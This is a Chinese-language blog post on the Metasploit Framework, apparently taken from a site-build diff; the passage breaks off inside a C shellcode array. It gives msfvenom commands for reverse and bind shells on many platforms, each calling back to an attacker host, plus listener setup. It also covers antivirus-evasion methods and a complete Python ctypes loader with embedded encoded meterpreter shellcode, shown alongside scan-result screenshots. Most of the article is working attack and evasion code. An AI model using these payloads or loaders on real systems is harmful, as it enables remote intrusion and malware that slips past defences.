+            <span class="post-date" title="2019-12-03 13:41:27">2019/12/03</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"
+           data-tag="linux,提权"
+           data-author="" >
+            <span class="post-title" title="提权之Linux-环境变量">提权之Linux-环境变量</span>
+            <span class="post-date" title="2020-02-09 11:16:30">2020/02/09</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-%E5%88%A9%E7%94%A8%E9%80%9A%E9%85%8D%E7%AC%A6%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/"
+           data-tag="提权"
+           data-author="" >
+            <span class="post-title" title="提权之Linux-利用通配符本地提权">提权之Linux-利用通配符本地提权</span>
+            <span class="post-date" title="2020-02-13 22:04:26">2020/02/13</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8BWindows/"
+           data-tag="windows,提权"
+           data-author="" >
+            <span class="post-title" title="提权之Windows">提权之Windows</span>
+            <span class="post-date" title="2020-05-21 21:46:22">2020/05/21</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-CVE-2018-8120/"
+           data-tag="提权"
+           data-author="" >
+            <span class="post-title" title="提权之windows-CVE-2018-8120">提权之windows-CVE-2018-8120</span>
+            <span class="post-date" title="2020-02-12 12:46:56">2020/02/12</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8Blinux-suid/"
+           data-tag="Linux,提权"
+           data-author="" >
+            <span class="post-title" title="提权之linux-suid">提权之linux-suid</span>
+            <span class="post-date" title="2020-04-07 21:02:38">2020/04/07</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bsudo-ed/"
+           data-tag="Linux,提权"
+           data-author="" >
+            <span class="post-title" title="提权之Linux sudo-ed">提权之Linux sudo-ed</span>
+            <span class="post-date" title="2019-12-14 17:54:23">2019/12/14</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/"
+           data-tag="windows,提权,DLL"
+           data-author="" >
+            <span class="post-title" title="提权之windows-DLL注入">提权之windows-DLL注入</span>
+            <span class="post-date" title="2020-03-23 16:52:18">2020/03/23</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"
+           data-tag="漏洞"
+           data-author="" >
+            <span class="post-title" title="文件解析漏洞">文件解析漏洞</span>
+            <span class="post-date" title="2020-01-14 21:35:14">2020/01/14</span>
+        </a>
+        
+        <a  class=""
+           href="/%E5%85%8D%E6%9D%80/"
+           data-tag="免杀,绕过"
+           data-author="" >
+            <span class="post-title" title="免杀">免杀</span>
+            <span class="post-date" title="2020-05-01 12:58:09">2020/05/01</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"
+           data-tag="漏洞"
+           data-author="" >
+            <span class="post-title" title="未授权访问漏洞">未授权访问漏洞</span>
+            <span class="post-date" title="2020-03-29 14:03:13">2020/03/29</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux/"
+           data-tag="linux,提权"
+           data-author="" >
+            <span class="post-title" title="提权之Linux">提权之Linux</span>
+            <span class="post-date" title="2020-05-24 00:58:53">2020/05/24</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"
+           data-tag="知识"
+           data-author="" >
+            <span class="post-title" title="正则表达式">正则表达式</span>
+            <span class="post-date" title="2019-12-10 21:08:11">2019/12/10</span>
+        </a>
+        
+        <a  class=""
+           href="/%E7%BB%95WAF%E4%B9%8Bsafedog/"
+           data-tag="WAF"
+           data-author="" >
+            <span class="post-title" title="绕WAF之safedog">绕WAF之safedog</span>
+            <span class="post-date" title="2019-12-27 20:28:35">2019/12/27</span>
+        </a>
+        
+        <a  class=""
+           href="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/"
+           data-tag="WAF"
+           data-author="" >
+            <span class="post-title" title="绕WAF之分块传输">绕WAF之分块传输</span>
+            <span class="post-date" title="2019-12-27 09:24:52">2019/12/27</span>
+        </a>
+        
+        <a  class=""
+           href="/%E8%84%B1%E5%A3%B3/"
+           data-tag="MISC,逆向"
+           data-author="" >
+            <span class="post-title" title="脱壳一">脱壳一</span>
+            <span class="post-date" title="2019-12-26 00:13:05">2019/12/26</span>
+        </a>
+        
+        <a  class=""
+           href="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/"
+           data-tag="漏洞,端口"
+           data-author="" >
+            <span class="post-title" title="漏洞记录">漏洞记录</span>
+            <span class="post-date" title="2020-06-06 21:36:18">2020/06/06</span>
+        </a>
+        
+        <a  class=""
+           href="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"
+           data-tag="工具,内网渗透,端口"
+           data-author="" >
+            <span class="post-title" title="端口转发与隧道技术">端口转发与隧道技术</span>
+            <span class="post-date" title="2020-01-05 02:38:08">2020/01/05</span>
+        </a>
+        
+        <a  class=""
+           href="/%E8%84%B1%E5%A3%B3%E4%BA%8C/"
+           data-tag="MISC,逆向"
+           data-author="" >
+            <span class="post-title" title="脱壳二">脱壳二</span>
+            <span class="post-date" title="2020-01-01 15:51:38">2020/01/01</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-MetasploitFramework" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">MetasploitFramework</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            
+            <a class="color3">工具</a>
+            
+            <a class="color4">MSF</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title=''>2020-05-04 22:54<br/>
+        更新时间: 2020-06-30 20:50:40
+        </time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-MSF"><span class="toc-text">0x00 MSF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-msfvenom"><span class="toc-text">0x10 msfvenom</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-Msfvenom生成免杀"><span class="toc-text">0x11 Msfvenom生成免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-常驻免杀"><span class="toc-text">0x12 常驻免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-Metasploit"><span class="toc-text">0x20 Metasploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x21-信息搜集"><span class="toc-text">0x21 信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x22-漏洞探测与利用"><span class="toc-text">0x22 漏洞探测与利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x23-权限提升"><span class="toc-text">0x23 权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x24-内网渗透"><span class="toc-text">0x24 内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x25-MSF5-gt-命令"><span class="toc-text">0x25 MSF5&gt;命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x30-Meterpreter"><span class="toc-text">0x30 Meterpreter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x31-常用命令"><span class="toc-text">0x31 常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x32-文件操作命令"><span class="toc-text">0x32 文件操作命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x33-网络命令"><span class="toc-text">0x33 网络命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x34-系统命令"><span class="toc-text">0x34 系统命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x35-其他命令"><span class="toc-text">0x35 其他命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x36-timestomp（文件时间）"><span class="toc-text">0x36 timestomp（文件时间）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x40-权限维持"><span class="toc-text">0x40 权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x50-痕迹清除"><span class="toc-text">0x50 痕迹清除</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x60-mimikatz相关命令"><span class="toc-text">0x60 mimikatz相关命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xF0-工具帮助信息"><span class="toc-text">0xF0 工具帮助信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xFE-参考"><span class="toc-text">0xFE 参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xFF-C语言版shellcode"><span class="toc-text">0xFF C语言版shellcode</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-MSF"><a href="#0x00-MSF" class="headerlink" title="0x00 MSF"></a>0x00 MSF</h2><p>&ensp;&ensp;&ensp;&ensp;MSF：Metasploit Framework，一种集信息搜集、漏洞探测、漏洞利用、权限提升、内网渗透、权限维持、痕迹清除于一身，漏洞验证与利用的工具框架。</p>
+<h2 id="0x10-msfvenom"><a href="#0x10-msfvenom" class="headerlink" title="0x10 msfvenom"></a>0x10 msfvenom</h2><ol>
+<li>2015-6-8起，msfvenom是msfpayload和msfencode的组合。</li>
+<li><a href="#msfvenom">msfvenom帮助信息</a></li>
+</ol>
+<p><strong>各版本反弹shell</strong></p>
+<ol>
+<li><strong>windows：</strong></li>
+<li><ul>
+<li><code>msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp -i 7 -e x86/shikata_ga_nai lhost=[攻击机IP] lport=[攻击机端口] -f exe &gt;/tmp/test.exe</code></li>
+</ul>
+</li>
+<li><strong>Linux：</strong></li>
+<li><ul>
+<li><code>msfvenom -p linux/meterpreter/reverse_tcp --platform linux -a x86 -e x86/shikata_ga_nai -i 13 lhost=[攻击机IP] lport=[攻击机端口] -f elf -o test.elf</code></li>
+</ul>
+</li>
+<li><strong>Mac：</strong></li>
+<li><ul>
+<li><code>msfvenom -p osx/meterpreter/reverse_tcp --platform 0sx -a x86 lhost=[攻击机IP] lport=[攻击机端口] -f macho -o test.macho</code></li>
+</ul>
+</li>
+<li><strong>Android：</strong></li>
+<li><ul>
+<li><code>msfvenom -p android/meterpreter/reverse_tcp lhost=[攻击机IP] lport=[攻击机端口] -o test.apk</code></li>
+</ul>
+</li>
+<li><strong>Asp/Aspx：</strong></li>
+<li><ul>
+<li><code>msfvenom -p windows/meterpreter/reverse_tcp --platform windows lhost=[攻击机IP] lport=[攻击机端口] -f aspx -o test.aspx</code></li>
+</ul>
+</li>
+<li><ul>
+<li><code>msfvenom -p windows/meterpreter/reverse_tcp --platform windows lhost=[攻击机IP] lport=[攻击机端口] -f asp -o test.asp</code></li>
+</ul>
+</li>
+<li><strong>JSP/WAR：</strong></li>
+<li><ul>
+<li><code>msfvenom -p java/jsp_shell_reverse_tcp lhost=[攻击机IP] lport=[攻击机端口] -f raw -o test.jsp</code></li>
+</ul>
+</li>
+<li><ul>
+<li><code>msfvenom -p java/jsp_shell_reverse_tcp lhost=[攻击机IP] lport=[攻击机端口] -f raw -o test.war</code></li>
+</ul>
+</li>
+<li><strong>PHP：</strong></li>
+<li><ul>
+<li><code>msfvenom -p php/meterpreter/reverse_tcp lhost=[攻击机IP] lport=[攻击机端口] -f raw -o test.php</code></li>
+</ul>
+</li>
+<li><strong>BASH：</strong></li>
+<li><ul>
+<li><code>msfvenom -p cmd/unix/reverse_bash lhost=[攻击机IP] lport=[攻击机端口]-f raw -o test.sh</code></li>
+</ul>
+</li>
+<li><strong>Python：</strong></li>
+<li><ul>
+<li><code>msfvenom -p python/meterpreter/reverse_tcp lhost=[攻击机IP] lport=[攻击机端口] -f raw -o test.py</code></li>
+</ul>
+</li>
+<li><strong>perl：</strong></li>
+<li><ul>
+<li><code>msfvenom -p cmd/unix/reverse_perl lhost=[攻击机IP] lport=[攻击机端口] -f raw -o test.pl</code></li>
+</ul>
+</li>
+<li></li>
+<li><strong>例子：</strong></li>
+<li>攻击机192.168.100.4开启监听端口4444</li>
+<li>use exploit/multi/handler</li>
+<li>set payload windows/meterpreter/reverse_tcp</li>
+<li>set lhost 192.168.100.4 #攻击机IP</li>
+<li>set lport 4444 #攻击机port，一般默认4444</li>
+<li>run</li>
+<li>把test.exe上传到目的主机并执行，192.168.100.4就可以接收到反向连接的meterpreter</li>
+<li>但是test.exe容易被目的主机的杀软隔离。</li>
+<li><a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/" target="_blank" rel="noopener">msfvenom相关教程</a></li>
+</ol>
+<p><strong>各版本直连shell</strong></p>
+<ol>
+<li><strong>windows：</strong></li>
+<li><ul>
+<li><code>msfvenom -p windows/shell/bind_tcp lport=[攻击机port，这里4444] -f exe &gt;/root/tmp/test.exe</code></li>
+</ul>
+</li>
+<li><ul>
+<li><code>msfvenom -p windows/shell_bind_tcp lport=[攻击机port，这里4444] -f exe &gt;/root/tmp/test.exe</code></li>
+</ul>
+</li>
+<li><strong>Linux：</strong></li>
+<li><ul>
+<li><code>msfvenom -p linux/x64/shell/bind_tcp lport=[攻击机port，这里4444] -f elf &gt;/root/tmp/test.elf</code></li>
+</ul>
+</li>
+<li><strong>例子：</strong></li>
+<li>攻击机192.168.100.4开启监听端口4444</li>
+<li>use exploit/multi/handler</li>
+<li>set payload windows/shell/bind_tcp</li>
+<li>set lport 4444 #攻击机port，一般默认4444</li>
+<li>set rhost 192.168.100.3 #受害机IP</li>
+<li>run</li>
+<li>开启监听后，上传test.exe到受害机并执行即可获取受害机的shell</li>
+<li><img src="/MetasploitFramework/21.png" alt></li>
+</ol>
+<h2 id="0x11-Msfvenom生成免杀"><a href="#0x11-Msfvenom生成免杀" class="headerlink" title="0x11 Msfvenom生成免杀"></a>0x11 Msfvenom生成免杀</h2><p><strong>静态免杀一</strong></p>
+<ol>
+<li><code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b &#39;\x00&#39; lhost=192.168.100.4 lport=4444 -f exe &gt;/root/tmp/test.exe</code></li>
+<li>-e：编码方式，-i：编码次数，-b：去除指定字符</li>
+</ol>
+<p><strong>静态免杀二</strong></p>
+<ol>
+<li><code>msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.100.4 lport=4444 -f raw &gt; /root/tmp/test.py</code></li>
+<li><img src="/MetasploitFramework/11.png" alt></li>
+<li><strong>windows环境：</strong></li>
+<li>安装<strong>32位python2</strong>，安装<a href="https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download" target="_blank" rel="noopener">py2exe for python2.7</a></li>
+<li><strong>准备脚本：</strong>setup.py、test.py</li>
+</ol>
+<p><strong>setup.py</strong></p>
+<pre><code># encoding:utf-8
+
+from distutils.core import setup
+import py2exe
+
+setup(
+name = &quot;test&quot;,
+description = &quot;Python-based App&quot;,
+version = &quot;1.0&quot;,
+console = [&quot;test.py&quot;],
+options = {&quot;py2exe&quot;:{&quot;bundle_files&quot;:1,&quot;packages&quot;:&quot;ctypes&quot;,&quot;includes&quot;:&quot;base64,sys,socket,struct,time,code,platform,getpass,shutil&quot;,}},
+zipfile = None
+)</code></pre><ol>
+<li><p><strong>把.py编译成.exe：</strong></p>
+</li>
+<li><p>python ./setup.py py2exe</p>
+</li>
+<li><p><img src="/MetasploitFramework/12.png" alt></p>
+</li>
+<li><p><strong>MSF开启监听：</strong></p>
+</li>
+<li><p>use exploit/multi/handler</p>
+</li>
+<li><p>set payload python/meterpreter/reverse_tcp</p>
+</li>
+<li><p>set lhost 192.168.100.4</p>
+</li>
+<li><p>run</p>
+</li>
+<li><p>执行test.exe即可反弹shell</p>
+</li>
+<li><p><img src="/MetasploitFramework/13.png" alt></p>
+</li>
+<li><p><img src="/MetasploitFramework/14.png" alt="virustotal扫描"></p>
+</li>
+<li><p><img src="/MetasploitFramework/15.png" alt="virscan扫描"></p>
+</li>
+<li><p><img src="/MetasploitFramework/16.png" alt="threatbook扫描"></p>
+</li>
+<li><p>pyinstaller生成exe</p>
+</li>
+<li><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.100.4 lport=4444 -e x86/shikata_ga_nai -i 7 -f py -o test.py</code></p>
+</li>
+<li><p><img src="/MetasploitFramework/19.png" alt></p>
+</li>
+</ol>
+<p>test.py</p>
+<pre><code>buf =  b&quot;&quot;
+buf += b&quot;\xd9\xeb\xb8\xae\xf4\xf6\x2c\xd9\x74\x24\xf4\x5b\x2b&quot;
+buf += b&quot;\xc9\xb1\x7e\x83\xeb\xfc\x31\x43\x16\x03\x43\x16\xe2&quot;
+buf += b&quot;\x5b\x2e\x3a\x94\x3a\x42\x95\xf7\xe5\x29\x3e\x0c\x4e&quot;
+buf += b&quot;\xf9\xf7\x5d\x08\xcc\x44\x89\x6b\xed\x4f\xb6\xb1\x6c&quot;
+buf += b&quot;\xfb\x5f\x43\xfd\x86\x3c\x74\xed\xf1\x79\xc1\xc2\x7d&quot;
+buf += b&quot;\xaa\x4f\x1a\x5c\x08\x82\x2e\x5a\x96\x94\x1b\x50\x84&quot;
+buf += b&quot;\x76\x05\x2b\x91\xc1\x8e\x61\x8d\x35\x45\x0d\xa2\xc8&quot;
+buf += b&quot;\x66\xd6\x90\xb9\x02\x31\x38\xcf\x0c\xca\xb4\xba\x3e&quot;
+buf += b&quot;\x9f\xff\x6f\x07\x54\x04\x0a\x82\x94\x2b\x39\xa9\xa1&quot;
+buf += b&quot;\x96\xa5\xf9\xed\x72\x9a\x86\xbc\xb1\x42\x09\x66\x74&quot;
+buf += b&quot;\x2c\x0c\x0e\xb3\x4c\x39\x87\x59\x6b\x49\x8f\xb0\xb4&quot;
+buf += b&quot;\x21\xe8\xfb\xcd\xe1\x1c\x70\xf6\x57\x79\x25\xc4\x85&quot;
+buf += b&quot;\x9f\x27\x08\xe1\x1f\xa9\x7f\xf1\xb2\x09\x54\x26\x4e&quot;
+buf += b&quot;\xd5\x8e\x1b\x7c\x6b\xf3\x9c\x5c\xc0\x7c\xed\xb1\xa4&quot;
+buf += b&quot;\x20\x43\x0a\x0f\x0b\x30\xfb\x3c\x9b\xd7\xe8\x43\x35&quot;
+buf += b&quot;\x61\xa1\x4b\xa7\x4b\x1c\xd3\xeb\x5c\x33\x3b\xaf\x17&quot;
+buf += b&quot;\xc5\xdc\xbb\xc8\xd6\x5f\xe2\x7e\x1e\xf3\xe5\x87\x8d&quot;
+buf += b&quot;\x2d\x78\x1f\x46\x06\xbc\x14\x29\xfb\x0f\xea\x36\xee&quot;
+buf += b&quot;\xc5\xea\xca\x55\xc3\x55\x93\x2b\x0a\x2b\x48\xf4\x20&quot;
+buf += b&quot;\xe0\xa3\xe3\x70\x69\xf7\x3b\x6e\xeb\x0d\x79\x3a\x56&quot;
+buf += b&quot;\xd1\xce\x60\x3c\xcd\x3d\x42\xec\xef\x64\x2d\xd4\x35&quot;
+buf += b&quot;\x0e\xab\xde\x41\x86\xb9\x4c\xd3\x2f\xa2\xbc\xd5\x0a&quot;
+buf += b&quot;\x27\x44\xd6\xa7\xef\x8f\x65\x94\x43\x8b\x01\x64\x6e&quot;
+buf += b&quot;\x13\x62\x3c\xb5\x9b\xfe\xcb\x9e\x9e\x3e\x6c\x3d\xc1&quot;
+buf += b&quot;\xc0\x86\x1f\x26\xba\x93\x10\xa2\x4d\x0c\x04\x14\xd8&quot;
+buf += b&quot;\xcc\xb7\xa8\xc6\x66\xa2\x45\x38\x99\x19\xcd\xff\x5b&quot;
+buf += b&quot;\x16\x9a\xb5\x1c\x84\x5c\x44\xe2\xc0\xca\xb0\x7f\xba&quot;
+buf += b&quot;\x42\x58\xa8\xe2\x5a\xe8\xe6\xa0\xd0\xd2\x20\xa7\x63&quot;
+buf += b&quot;\x2b\x18\x8d\x7b\x9a\x0b\xa2\xaf\xb2\xc1\x8f\x32\x19&quot;
+buf += b&quot;\x74\x3d\x4c\x79\xf2\x32\x0d\xb8\x0a\xc3\x90\xe5\xa2&quot;
+buf += b&quot;\x9a\x26\x05\x79\xd6\x77\xe8\x04\x0a\x20\xbf\x72\x0a&quot;
+buf += b&quot;\x8d\xb4\x73\x32\x17\xe4\x7b\x34\xc9\xc7\x20\x03\xc0&quot;
+buf += b&quot;\xd1\xd4\xa1\x49\xed\x4e\x57\xec\x6c\xd1\x8d\xd5\x42&quot;
+buf += b&quot;\x4d\x33\x81\x98\x18\x35\x31\x41\x03\x5c\x77\x57\x6d&quot;
+buf += b&quot;\x42\x3f\x7a\x23\x35\x18\xce\x7a\x8a\xd2\x4c\xd0\x4d&quot;
+buf += b&quot;\x53\x45\xf1\xca\x3b\x84\x8c\xb5\x00\xb8\x37\x7c\x8d&quot;
+buf += b&quot;\x11\x4a\xdb\xa2\x1c\xc8\x2e\xf7\xfa\x50\xc5\xdb\x96&quot;
+buf += b&quot;\xef\x8a\x9b\xb8\x69\xf1\x5d\xf1\x87\xee\xb6\x98\x15&quot;
+buf += b&quot;\x44\x59\x29\x01\xa1\x3a\x92\x8c\x90\x5e\x0b\xa9\x3c&quot;
+buf += b&quot;\x48\xcd\xae\xe9\xb4\x7e\x0f\x94\xf7\xaf\x5a\x21\x66&quot;
+buf += b&quot;\xce\x04\xa8\xe7\xde\x71\x0d\x03\xae\x3f&quot;</code></pre><p>shell.py</p>
+<pre><code>import ctypes
+
+def execute():
+    # Bind shell
+    shellcode = bytearray(
+    &quot;\xd9\xeb\xb8\xae\xf4\xf6\x2c\xd9\x74\x24\xf4\x5b\x2b&quot;
+    &quot;\xc9\xb1\x7e\x83\xeb\xfc\x31\x43\x16\x03\x43\x16\xe2&quot;
+    &quot;\x5b\x2e\x3a\x94\x3a\x42\x95\xf7\xe5\x29\x3e\x0c\x4e&quot;
+    &quot;\xf9\xf7\x5d\x08\xcc\x44\x89\x6b\xed\x4f\xb6\xb1\x6c&quot;
+    &quot;\xfb\x5f\x43\xfd\x86\x3c\x74\xed\xf1\x79\xc1\xc2\x7d&quot;
+    &quot;\xaa\x4f\x1a\x5c\x08\x82\x2e\x5a\x96\x94\x1b\x50\x84&quot;
+    &quot;\x76\x05\x2b\x91\xc1\x8e\x61\x8d\x35\x45\x0d\xa2\xc8&quot;
+    &quot;\x66\xd6\x90\xb9\x02\x31\x38\xcf\x0c\xca\xb4\xba\x3e&quot;
+    &quot;\x9f\xff\x6f\x07\x54\x04\x0a\x82\x94\x2b\x39\xa9\xa1&quot;
+    &quot;\x96\xa5\xf9\xed\x72\x9a\x86\xbc\xb1\x42\x09\x66\x74&quot;
+    &quot;\x2c\x0c\x0e\xb3\x4c\x39\x87\x59\x6b\x49\x8f\xb0\xb4&quot;
+    &quot;\x21\xe8\xfb\xcd\xe1\x1c\x70\xf6\x57\x79\x25\xc4\x85&quot;
+    &quot;\x9f\x27\x08\xe1\x1f\xa9\x7f\xf1\xb2\x09\x54\x26\x4e&quot;
+     &quot;\xd5\x8e\x1b\x7c\x6b\xf3\x9c\x5c\xc0\x7c\xed\xb1\xa4&quot;
+    &quot;\x20\x43\x0a\x0f\x0b\x30\xfb\x3c\x9b\xd7\xe8\x43\x35&quot;
+    &quot;\x61\xa1\x4b\xa7\x4b\x1c\xd3\xeb\x5c\x33\x3b\xaf\x17&quot;
+    &quot;\xc5\xdc\xbb\xc8\xd6\x5f\xe2\x7e\x1e\xf3\xe5\x87\x8d&quot;
+    &quot;\x2d\x78\x1f\x46\x06\xbc\x14\x29\xfb\x0f\xea\x36\xee&quot;
+    &quot;\xc5\xea\xca\x55\xc3\x55\x93\x2b\x0a\x2b\x48\xf4\x20&quot;
+    &quot;\xe0\xa3\xe3\x70\x69\xf7\x3b\x6e\xeb\x0d\x79\x3a\x56&quot;
+    &quot;\xd1\xce\x60\x3c\xcd\x3d\x42\xec\xef\x64\x2d\xd4\x35&quot;
+    &quot;\x0e\xab\xde\x41\x86\xb9\x4c\xd3\x2f\xa2\xbc\xd5\x0a&quot;
+    &quot;\x27\x44\xd6\xa7\xef\x8f\x65\x94\x43\x8b\x01\x64\x6e&quot;
+    &quot;\x13\x62\x3c\xb5\x9b\xfe\xcb\x9e\x9e\x3e\x6c\x3d\xc1&quot;
+    &quot;\xc0\x86\x1f\x26\xba\x93\x10\xa2\x4d\x0c\x04\x14\xd8&quot;
+    &quot;\xcc\xb7\xa8\xc6\x66\xa2\x45\x38\x99\x19\xcd\xff\x5b&quot;
+    &quot;\x16\x9a\xb5\x1c\x84\x5c\x44\xe2\xc0\xca\xb0\x7f\xba&quot;
+    &quot;\x42\x58\xa8\xe2\x5a\xe8\xe6\xa0\xd0\xd2\x20\xa7\x63&quot;
+    &quot;\x2b\x18\x8d\x7b\x9a\x0b\xa2\xaf\xb2\xc1\x8f\x32\x19&quot;
+    &quot;\x74\x3d\x4c\x79\xf2\x32\x0d\xb8\x0a\xc3\x90\xe5\xa2&quot;
+    &quot;\x9a\x26\x05\x79\xd6\x77\xe8\x04\x0a\x20\xbf\x72\x0a&quot;
+    &quot;\x8d\xb4\x73\x32\x17\xe4\x7b\x34\xc9\xc7\x20\x03\xc0&quot;
+    &quot;\xd1\xd4\xa1\x49\xed\x4e\x57\xec\x6c\xd1\x8d\xd5\x42&quot;
+    &quot;\x4d\x33\x81\x98\x18\x35\x31\x41\x03\x5c\x77\x57\x6d&quot;
+    &quot;\x42\x3f\x7a\x23\x35\x18\xce\x7a\x8a\xd2\x4c\xd0\x4d&quot;
+    &quot;\x53\x45\xf1\xca\x3b\x84\x8c\xb5\x00\xb8\x37\x7c\x8d&quot;
+    &quot;\x11\x4a\xdb\xa2\x1c\xc8\x2e\xf7\xfa\x50\xc5\xdb\x96&quot;
+    &quot;\xef\x8a\x9b\xb8\x69\xf1\x5d\xf1\x87\xee\xb6\x98\x15&quot;
+    &quot;\x44\x59\x29\x01\xa1\x3a\x92\x8c\x90\x5e\x0b\xa9\x3c&quot;
+    &quot;\x48\xcd\xae\xe9\xb4\x7e\x0f\x94\xf7\xaf\x5a\x21\x66&quot;
+    &quot;\xce\x04\xa8\xe7\xde\x71\x0d\x03\xae\x3f&quot;
+     )
+
+    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+    ctypes.c_int(len(shellcode)),
+    ctypes.c_int(0x3000),
+    ctypes.c_int(0x40))
+
+    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+
+    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+    buf,
+    ctypes.c_int(len(shellcode)))
+
+    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+    ctypes.c_int(0),
+    ctypes.c_int(ptr),
+    ctypes.c_int(0),
+    ctypes.c_int(0),
+    ctypes.pointer(ctypes.c_int(0)))
+
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
+    ctypes.c_int(-1))
+if __name__ == &quot;__main__&quot;:
+    execute()</code></pre><ol>
+<li>pyinstaller -F –console shell.py</li>
+<li><img src="/MetasploitFramework/20.png" alt></li>
+<li>插眼</li>
+</ol>
+<p><strong>静态免杀三</strong><br>2. <code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b &#39;\x00&#39; lhost=192.168.100.4 lport=4444 -f c #生成基于C语言的shellcode</code></p>
+<pre><code>unsigned char buf[] = 
+&quot;\xbd\x3c\x18\xf8\x0a\xda\xdf\xd9\x74\x24\xf4\x5a\x33\xc9\xb1&quot;
+&quot;\x71\x31\x6a\x13\x83\xc2\x04\x03\x6a\x33\xfa\x0d\xb5\x27\xbb&quot;
+&quot;\xe4\x6d\x6a\xfb\x2e\x05\xb0\x08\x88\xd5\x71\x41\x43\x2b\xf9&quot;
+&quot;\xb6\x17\xa3\x05\xb5\x6f\x24\x7b\x0e\x5f\x21\x14\x2c\xa7\x37&quot;
+&quot;\x87\x2c\x26\x2c\x6a\xd5\x0d\xfd\x38\x81\x4b\xcc\x94\xae\x6c&quot;
+&quot;\x85\x7f\xb9\xc8\xf0\xd2\x1f\x91\x49\x41\x03\x47\x93\x35\x45&quot;
+&quot;\x09\x6e\xa1\x09\x45\xdf\xe0\x25\x29\x99\x23\xc4\xac\xf1\x5c&quot;
+&quot;\xa1\xdd\xb9\xc4\x52\x55\x07\x86\x08\xf4\x74\x63\x21\x65\xc7&quot;
